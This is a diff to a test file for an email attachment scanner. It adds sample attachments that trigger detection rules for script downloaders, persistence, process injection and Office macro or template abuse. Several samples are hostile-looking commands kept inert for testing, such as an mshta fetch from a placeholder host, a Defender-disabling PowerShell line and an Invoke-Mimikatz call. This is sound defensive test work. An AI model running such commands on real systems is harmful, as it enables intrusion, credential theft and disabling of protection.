@@ -3,6 +3,7 @@ consistent with its config. Messages are built here, parsed by the real guest pa
 the real engine; only the sandbox is replaced (tests/sandbox/test_email_sandbox.py covers that).
 """
 
+import deephelp as dh
 import filehelp as fh
 import pytest
 from mailhelp import PHISH_LINK, analyze, eml, fired, multipart
@@ -26,6 +27,28 @@ ATTACK_IDS = {
     "T1027.006",
     "T1036.007",
     "T1036.002",
+    # deep content rules (ADR-020). Confirmed by name on attack.mitre.org (content v20.1):
+    "T1027",
+    "T1027.002",
+    "T1027.009",
+    "T1036.008",
+    "T1056.002",
+    "T1059",
+    "T1547.001",
+    "T1559.002",
+    "T1564.003",
+    # Not reached when checking (the long list page was cut off), used from long-standing names:
+    # T1003 credential dumping, T1055 process injection, T1105 ingress tool transfer, T1137 Office
+    # application startup, T1218 system binary proxy execution, T1221 template injection, T1497
+    # sandbox evasion, T1562.001 disable or modify tools.
+    "T1003",
+    "T1055",
+    "T1105",
+    "T1137",
+    "T1218",
+    "T1221",
+    "T1497",
+    "T1562.001",
 }
 
 
@@ -210,6 +233,124 @@ CASES: dict[str, tuple[bytes, bytes]] = {
 }
 
 
+# ---- what is inside files (ADR-020): inert samples from deephelp -------------------------------
+
+
+def blob(data: bytes | str, name: str = "x.dat") -> bytes:
+    """One attachment with a neutral name, so only its CONTENT can fire a rule."""
+    raw = data.encode() if isinstance(data, str) else data
+    return attach(name, raw, BINARY)
+
+
+def hidden(text: str) -> str:
+    return f"$a = '{dh.b64(text)}'\r\nWrite-Host $a\r\n$b = 2\r\n"
+
+
+PS_QUIET_ENCODED = "powershell.exe -enc " + dh.b64_utf16("Write-Host 'hi'")
+CASES.update(
+    {
+        "intel.hash_known_bad": (blob(dh.EICAR), blob("just a note")),
+        "content.eicar": (blob(dh.EICAR), blob("just a note")),
+        "content.script_downloader": (blob(dh.VBS_DROPPER), blob(dh.VBS_BENIGN)),
+        "content.script_encoded": (blob(PS_QUIET_ENCODED), blob(dh.PS_BENIGN)),
+        "content.script_hidden_layers": (
+            blob(hidden("Write-Host hello, this block is encoded but harmless")),
+            blob(dh.PS_BENIGN),
+        ),
+        "content.script_evasive_launch": (
+            blob("$p = 1\r\nStart-Process notepad.exe -WindowStyle Hidden\r\nWrite-Host $p"),
+            blob("$p = 1\r\nStart-Process notepad.exe\r\nWrite-Host $p"),
+        ),
+        "content.script_persistence": (
+            blob(
+                'Set sh = CreateObject("WScript.Shell")\r\nDim a\r\nsh.Run "schtasks /create /tn x"'
+            ),
+            blob('Set sh = CreateObject("WScript.Shell")\r\nDim a\r\nsh.Run "notepad"'),
+        ),
+        "content.script_lolbin": (
+            blob("@echo off\r\nsetlocal\r\nmshta http://x.test/a.hta"),
+            blob("@echo off\r\nsetlocal\r\necho hi"),
+        ),
+        "content.defense_evasion": (
+            blob("$a = 1\r\nSet-MpPreference -DisableRealtimeMonitoring $true\r\nWrite-Host $a"),
+            blob(dh.PS_BENIGN),
+        ),
+        "content.process_injection": (
+            blob("$a = 1\r\nAdd-Type -MemberDefinition 'VirtualAlloc' -Name x\r\nWrite-Host $a"),
+            blob("$a = 1\r\nAdd-Type -AssemblyName System.Windows.Forms\r\nWrite-Host $a"),
+        ),
+        "content.credential_access": (
+            blob("$a = 1\r\nInvoke-Mimikatz\r\nWrite-Host $a"),
+            blob(dh.PS_BENIGN),
+        ),
+        "content.credential_prompt": (
+            blob("$c = Get-Credential\r\nWrite-Host $c"),
+            blob("$c = Get-Date\r\nWrite-Host $c"),
+        ),
+        "content.anti_analysis": (
+            blob("$a = 1\r\nGet-WmiObject Win32_BIOS\r\nStart-Sleep -Seconds 600\r\nWrite-Host $a"),
+            blob(dh.PS_BENIGN),
+        ),
+        "content.embedded_executable": (
+            blob(b"Dim a\r\nMsgBox a\r\n" + dh.pe()),
+            blob(dh.VBS_BENIGN),
+        ),
+        "content.disguised_program": (
+            blob(dh.VBS_BENIGN, "report.pdf"),
+            blob(dh.VBS_BENIGN, "report.dat"),
+        ),
+        "content.office_macro": (
+            blob(dh.ole_with_macro(dh.MACRO_QUIET)),
+            blob(dh.cfb({"WordDocument": b"x" * 5000})),
+        ),
+        "content.office_macro_autoexec": (
+            blob(dh.ole_with_macro(dh.MACRO_AUTOEXEC_SHELL)),
+            blob(dh.ole_with_macro(dh.MACRO_QUIET)),
+        ),
+        "content.office_remote_template": (
+            blob(
+                dh.ooxml(
+                    {
+                        "word/_rels/document.xml.rels": dh.rels(
+                            ("attachedTemplate", "http://tpl-host.test/t.dotm", True)
+                        )
+                    }
+                )
+            ),
+            blob(dh.ooxml()),
+        ),
+        "content.office_dde": (
+            blob(dh.ooxml({"word/document.xml": b"<w:instrText> DDEAUTO c:\\x </w:instrText>"})),
+            blob(dh.ooxml()),
+        ),
+        "content.equation_editor": (
+            blob(dh.rtf_with_object(equation=True)),
+            blob(dh.rtf_with_object()),
+        ),
+        "content.ole_object": (blob(dh.rtf_with_object()), blob(b"{\\rtf1 hello}")),
+        "content.lnk_runs_interpreter": (blob(dh.lnk(args="/c calc")), blob(dh.lnk(args=""))),
+        "content.lnk_disguised": (
+            blob(dh.lnk(args="/c calc", icon=r"C:\Windows\System32\shell32.dll")),
+            blob(dh.lnk(args="/c calc")),
+        ),
+        "content.pe_packed": (blob(dh.pe(packed=True)), blob(dh.pe())),
+        "content.pe_injection_or_downloader": (
+            blob(dh.pe(strings=b"VirtualAllocEx WriteProcessMemory CreateRemoteThread")),
+            blob(dh.pe()),
+        ),
+    }
+)
+# Files that are dangerous by TYPE already (a shortcut, a program) also fire a second, independent
+# rule when their content is bad; two strong categories rightly make them MALICIOUS. Everything else
+# must stay below MALICIOUS on its own positive message, and the exact-identification rules are
+# certain by design (rules/email/scoring.toml `certain`).
+TWO_CATEGORIES = {
+    "content.lnk_runs_interpreter",
+    "content.lnk_disguised",
+    "content.pe_injection_or_downloader",
+}
+
+
 def test_every_rule_has_a_case() -> None:
     assert set(CASES) == {r.id for r in RULES}
     assert len(RULES) == len({r.id for r in RULES})
@@ -227,6 +368,10 @@ def test_rule_stays_quiet_on_its_negative_message(rule_id: str) -> None:
 
 @pytest.mark.parametrize("rule_id", sorted(CASES))
 def test_no_rule_can_make_a_message_malicious_alone(rule_id: str) -> None:
+    if rule_id in scoring()["certain"]["rules"] or rule_id in TWO_CATEGORIES:
+        pytest.skip(
+            "exact identification, or a file already dangerous by type (see TWO_CATEGORIES)"
+        )
     v = analyze(CASES[rule_id][0]).report.verdict
     assert v.state is not VerdictState.MALICIOUS, (rule_id, [s.rule_id for s in v.signals])
 
